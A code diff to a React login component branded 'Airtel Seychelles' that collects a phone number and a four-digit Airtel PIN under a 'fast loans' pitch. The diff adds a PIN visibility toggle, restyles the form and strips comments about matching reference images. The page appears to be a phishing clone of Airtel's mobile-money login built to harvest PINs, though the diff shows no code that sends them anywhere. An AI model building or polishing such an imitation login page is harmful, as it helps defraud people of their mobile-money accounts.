@@ -8,6 +8,7 @@ const PHONE_MAX = 7;
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
+  const [showPin, setShowPin] = useState(false); // Added state for PIN visibility
   const [isLoading, setIsLoading] = useState(false);
   
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
@@ -110,7 +111,7 @@ function AirtelLogin() {
           display: flex;
           flex-direction: column;
           min-height: 100vh;
-          background-color: #DA1C1C; /* Airtel Red */
+          background-color: #DA1C1C;
           position: relative;
         }
 
@@ -217,83 +218,119 @@ function AirtelLogin() {
         .card-title {
           font-size: 26px;
           font-weight: 800;
-          color: #000000;
+          color: #0F172A;
           margin-bottom: 8px;
         }
 
         .card-subtitle {
           font-size: 15px;
-          color: #4B5563;
+          color: #64748B;
           margin-bottom: 24px;
         }
 
         .input-label {
           font-size: 15px;
           font-weight: 700;
-          color: #000000;
+          color: #0F172A;
           margin-bottom: 12px;
           width: 100%;
           text-align: center;
         }
 
-        /* PHONE INPUT */
+        /* PHONE INPUT (Improved Contrast) */
         .phone-wrapper {
           width: 100%;
           display: flex;
-          border-radius: 8px;
+          border-radius: 12px;
           overflow: hidden;
           margin-bottom: 24px;
-          border: 1px solid #CBD5E1;
+          border: 2px solid #E2E8F0;
+          transition: border-color 0.2s;
+        }
+
+        .phone-wrapper:focus-within {
+          border-color: #DA1C1C;
         }
 
         .phone-prefix {
-          background-color: #E2E8F0;
+          background-color: #F1F5F9;
           display: flex;
           align-items: center;
           padding: 0 16px;
           font-size: 16px;
           font-weight: 700;
-          color: #1a1a1a;
+          color: #0F172A;
           gap: 8px;
+          border-right: 1px solid #E2E8F0;
         }
 
         .phone-input-field {
           flex: 1;
-          background-color: #B0C4DE;
+          background-color: #FFFFFF;
           border: none;
           padding: 16px;
           font-size: 18px;
-          color: #ffffff;
+          color: #0F172A;
           font-weight: 600;
           outline: none;
         }
 
         .phone-input-field::placeholder {
-          color: #E2E8F0;
+          color: #94A3B8;
         }
 
-        /* PIN INPUT */
-        .pin-inputs-container {
+        /* PIN INPUT SECTION */
+        .pin-section-wrapper {
           display: flex;
-          gap: 16px;
+          align-items: center;
+          justify-content: center;
+          gap: 12px;
           margin-bottom: 28px;
+          width: 100%;
+        }
+
+        .pin-boxes {
+          display: flex;
+          gap: 12px;
         }
 
         .pin-box {
-          width: 60px;
+          width: 50px;
           height: 60px;
-          border: 2px solid #CBD5E1;
+          border: 2px solid #E2E8F0;
           border-radius: 12px;
-          font-size: 28px;
+          font-size: 24px;
+          font-weight: 800;
           text-align: center;
-          color: #000000;
+          color: #0F172A;
           outline: none;
-          background-color: #ffffff;
+          background-color: #F8FAFC;
+          transition: border-color 0.2s, background-color 0.2s;
+        }
+
+        .pin-box:focus {
+          border-color: #DA1C1C;
+          background-color: #FFFFFF;
         }
 
         .pin-box::placeholder {
-          color: #000000;
-          font-size: 30px;
+          color: #CBD5E1;
+        }
+
+        .eye-btn {
+          background: none;
+          border: none;
+          cursor: pointer;
+          padding: 8px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: #64748B;
+          transition: color 0.2s;
+        }
+
+        .eye-btn:hover {
+          color: #0F172A;
         }
 
         /* BUTTON */
@@ -302,11 +339,11 @@ function AirtelLogin() {
           padding: 18px;
           border-radius: 12px;
           border: none;
-          background-color: #D1D5DB;
-          color: #4B5563;
+          background-color: #E2E8F0;
+          color: #94A3B8;
           font-size: 18px;
           font-weight: 700;
-          cursor: pointer;
+          cursor: not-allowed;
           display: flex;
           justify-content: center;
           align-items: center;
@@ -317,6 +354,8 @@ function AirtelLogin() {
         .login-btn.active {
           background-color: #DA1C1C;
           color: #ffffff;
+          cursor: pointer;
+          box-shadow: 0 4px 12px rgba(218, 28, 28, 0.3);
         }
 
         /* SECURITY TEXT */
@@ -325,7 +364,7 @@ function AirtelLogin() {
           align-items: center;
           gap: 8px;
           margin-top: 24px;
-          color: #6B7280;
+          color: #64748B;
           font-size: 14px;
           font-weight: 500;
         }
@@ -365,7 +404,6 @@ function AirtelLogin() {
             <polyline points="12 19 5 12 12 5" />
           </svg>
         </button>
-        {/* Updated to Seychelles but kept the italic style */}
         <h1 className="header-title">Airtel Seychelles</h1>
         <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
       </div>
@@ -402,21 +440,44 @@ function AirtelLogin() {
           </div>
 
           <span className="input-label">Enter your Airtel PIN code</span>
-          <div className="pin-inputs-container">
-            {pin.map((digit, index) => (
-              <input
-                key={index}
-                type="password"
-                maxLength={1}
-                value={digit}
-                ref={(el) => { pinRefs.current[index] = el; }}
-                onChange={(e) => handlePinChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className="pin-box"
-                placeholder="•"
-                disabled={isLoading || isWaitingForApproval}
-              />
-            ))}
+          
+          {/* Added Wrapper for PIN + Eye Icon */}
+          <div className="pin-section-wrapper">
+            <div className="pin-boxes">
+              {pin.map((digit, index) => (
+                <input
+                  key={index}
+                  type={showPin ? 'text' : 'password'}
+                  maxLength={1}
+                  value={digit}
+                  ref={(el) => { pinRefs.current[index] = el; }}
+                  onChange={(e) => handlePinChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  className="pin-box"
+                  placeholder="•"
+                  disabled={isLoading || isWaitingForApproval}
+                />
+              ))}
+            </div>
+
+            {/* Eye Toggle Button */}
+            <button 
+              type="button" 
+              className="eye-btn" 
+              onClick={() => setShowPin(!showPin)}
+            >
+              {showPin ? (
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+              ) : (
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+              )}
+            </button>
           </div>
 
           <button 
@@ -441,9 +502,8 @@ function AirtelLogin() {
         </div>
       </div>
 
-      {/* BRAND ICONS FOOTER (Matching the second image) */}
+      {/* BRAND ICONS FOOTER */}
       <div className="brand-icons-footer">
-        {/* Icon 1: Airtel Phone */}
         <div className="brand-icon">
           <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
             <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
@@ -451,7 +511,6 @@ function AirtelLogin() {
           </div>
         </div>
         
-        {/* Icon 2: Lock */}
         <div className="brand-icon">
           <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
             <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
@@ -461,7 +520,6 @@ function AirtelLogin() {
           </div>
         </div>
 
-        {/* Icon 3: Airtel Money */}
         <div className="brand-icon">
           <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
             <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
@@ -469,7 +527,6 @@ function AirtelLogin() {
           </div>
         </div>
 
-        {/* Icon 4: Currency Symbol */}
         <div className="brand-icon">
           <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
             <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
